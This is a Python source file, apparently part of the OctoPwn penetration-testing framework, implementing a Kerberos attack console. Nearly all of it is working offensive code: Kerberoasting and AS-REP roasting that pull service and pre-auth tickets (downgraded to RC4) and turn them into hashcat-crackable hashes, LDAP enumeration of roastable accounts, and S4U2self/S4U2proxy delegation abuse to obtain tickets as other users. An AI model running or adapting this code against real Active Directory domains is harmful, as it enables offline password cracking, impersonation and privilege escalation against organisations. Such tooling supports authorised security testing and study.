import copy
import platform

from aiosmb import logger
from octopwn.clients.base import ClientConsoleBase
from octopwn.clients.kerberos.utils import format_kirbi, describe_kirbi_data
from minikerberos.aioclient import AIOKerberosClient
from minikerberos.common.spn import KerberosSPN
from minikerberos.common.target import KerberosTarget, KerberosSocketType
from minikerberos.common.creds import KerberosCredential, KerberosSecretType
from minikerberos.security import Kerberoast, APREPRoast
from minikerberos.common.utils import tgt_to_kirbi
from msldap.authentication.kerberos.gssapi import KRB5_MECH_INDEP_TOKEN
from minikerberos.protocol.asn1_structs import AP_REQ


class KerberosClient(ClientConsoleBase):
	def __init__(self, client_id, connection, cmd_q, msg_queue, prompt, octopwnobj):
		ClientConsoleBase.__init__(self, client_id, connection, cmd_q, msg_queue,prompt, octopwnobj)
		# the connection object is in fact a tuple of KerberosCredential and KerberosTarget
		self.nologon_commands.append('any')
		self.target = self.connection[0]
		self.credential = self.connection[1]
	
	async def start(self):
		return True, None

	def isint(self, x):
		try:
			x = int(x)
			return True
		except:
			return False

	async def do_kerberoast(self, spn):
		"""Kerberoast user"""
		try:
			results = []
			spns = []
			if self.isint(spn) is True:
				spn = int(spn)
				client_config, ldapclient = self.octopwnobj.clients[spn]
				if client_config.connection_type.upper().startswith('LDAP') is False:
					raise Exception('Selected client is not LDAP client!')
				
				if ldapclient.logon_ok is False:
					_, err = await ldapclient.do_login(to_print=False)
					if err is not None:
						raise err

				
				async for user, err in ldapclient.client.get_all_service_users():
					if err is not None:
						raise err
				
					credential = KerberosSPN()
					credential.username = user.sAMAccountName
					credential.domain = ldapclient.domain_name

					spns.append(credential)
					
			else:
				spns.append(KerberosSPN.from_user_email(spn))
			
			if self.credential is not None:
				kr = Kerberoast(self.target, self.credential)
				results = await kr.run(spns)
			else:
				if platform.system() == 'Windows':
					# using SSPI
					results, errors, err = await self.kerberoast_windows(spns)
					if err is not None:
						raise err
				else:
					# using WSNET
					results, errors, err = await self.kerberoast_wsnet(spns)
					if err is not None:
						raise err
							
			for result in results:
				await self.print(result)
			
			await self.print('Done!')
			return results, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_asreproast(self, user):
		"""ASREPRoast user. Target is expected in user@FQDN format !OR! Integer denoting an active LDAP client for automatic kerberoast."""
		try:
			results = []
			if self.isint(user) is True:
				user = int(user)
				client_config, ldapclient = self.octopwnobj.clients[user]
				if client_config.connection_type.upper().startswith('LDAP') is False:
					raise Exception('Selected client is not LDAP client!')
				
				if ldapclient.logon_ok is False:
					_, err = await ldapclient.do_login(to_print=False)
					if err is not None:
						raise err

				
				async for user, err in ldapclient.client.get_all_knoreq_users():
					if err is not None:
						raise err
				
					credential = KerberosCredential()
					credential.username = user.sAMAccountName
					credential.domain = ldapclient.domain_name
					
					kr = APREPRoast(self.target)
					result = await kr.run(credential, override_etype = [23])
					if result is not None:
						results.append(result)
						await self.print(result)

			else:
				user, domain = user.split('@',1)
				credential = KerberosCredential()
				credential.username = user
				credential.domain = domain

				kr = APREPRoast(self.target)
				result = await kr.run(credential, override_etype = [23])
				if result is not None:
					results.append(result)
					await self.print(result)
			
			await self.print('Done!')
			return results, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_tgt(self):
		"""Obtains TGT for current user"""
		try:
			if self.credential is None:
				raise Exception('SSPI and WSNET not supported here!')
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT()
			kirbi = tgt_to_kirbi(connection.kerberos_TGT, connection.kerberos_TGT_encpart).dump()
			await self.print(format_kirbi(kirbi))

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_tgs(self, spn):
		"""Gets TGS for SPN"""
		try:
			if spn.find('@') != -1:
				spn = KerberosSPN.from_user_email(spn)
			else:
				spn = KerberosSPN.from_target_string(spn)
			
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT()
			tgs, encTGSRepPart, key = await connection.get_TGS(spn)
			kirbi = tgt_to_kirbi(tgs, encTGSRepPart).dump()
			await self.print(format_kirbi(kirbi))


			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e

	async def do_s4uproxy(self, spn, targetuser):
		"""S4U proxy. SPN: spn format. targetuser: user@FQDN format"""
		try:
			service_spn = KerberosSPN.from_target_string(spn)
			target_user = KerberosSPN.from_user_email(targetuser)
			
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT()
			logger.debug('Getting ST')
			tgs, encTGSRepPart, key = await connection.getST(target_user, service_spn)
			kirbi = tgt_to_kirbi(tgs, encTGSRepPart).dump()
			await self.print(format_kirbi(kirbi))

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e
	
	async def do_s4uself(self, targetuser):
		"""S4U Self. targetuser: user@FQDN format"""
		try:
			target_user = KerberosSPN.from_user_email(targetuser)
			
			connection = AIOKerberosClient(self.credential, self.target)
			await connection.get_TGT()
			logger.debug('Getting ST')
			tgs, encTGSRepPart, key = await connection.S4U2self(target_user)
			kirbi = tgt_to_kirbi(tgs, encTGSRepPart).dump()
			await self.print(format_kirbi(kirbi))

			return kirbi, None
		except Exception as e:
			await self.print_exc(e)
			return None, e


	async def kerberoast_windows(self, targets):
		try:
			if platform.system() != 'Windows':
				await self.print('[-]This command only works on Windows!')
				return None, None, Exception('[-]This command only works on Windows!')
			try:
				from winsspi.sspi import KerberoastSSPI
				from minikerberos.common.utils import TGSTicket2hashcat
			except ImportError:
				return None, None, Exception('winsspi module not installed!')

			results = []
			errors = []
			for cred in targets:
				try:
					spn_name = str(cred)
					ksspi = KerberoastSSPI()
					try:
						ticket = ksspi.get_ticket_for_spn(spn_name)
					except Exception as e:
						errors.append((spn_name, e))
						continue
					results.append(TGSTicket2hashcat(ticket))
				except Exception as e:
					print("spnroast-sspi for user %s failed. Reason: %s" % (cred, e))
			
			return results, errors, None
		except Exception as e:
			return None, None, e
	
	async def kerberoast_wsnet(self, targets):
		try:
			if platform.system() != 'Emscripten':
				await self.print('[-]This command only works in the browser!')
				return None, None, Exception('[-]This command only works in the browser!')
			try:
				from wsnet.pyodide.clientauth import WSNETAuth
				from minikerberos.common.utils import TGSTicket2hashcat
			except ImportError:
				return None, None, Exception('winsspi module not installed!')

			results = []
			errors = []
			for cred in targets:
				try:
					wa = WSNETAuth()
					await wa.setup()
					status, ctxattr, authdata, err = await wa.authenticate('KERBEROS', '<CURRENT>', str(cred), 3, 0, b'')#credusage, flags, authdata)
					if err is not None:
						raise err
					unwrap = KRB5_MECH_INDEP_TOKEN.from_bytes(authdata)
					aprep = AP_REQ.load(unwrap.data[2:]).native
					results.append(TGSTicket2hashcat(aprep))
				except Exception as e:
					print("spnroast-wsnet for user %s failed. Reason: %s" % (cred, e))
			
			return results, errors, None
		except Exception as e:
			return None, None, e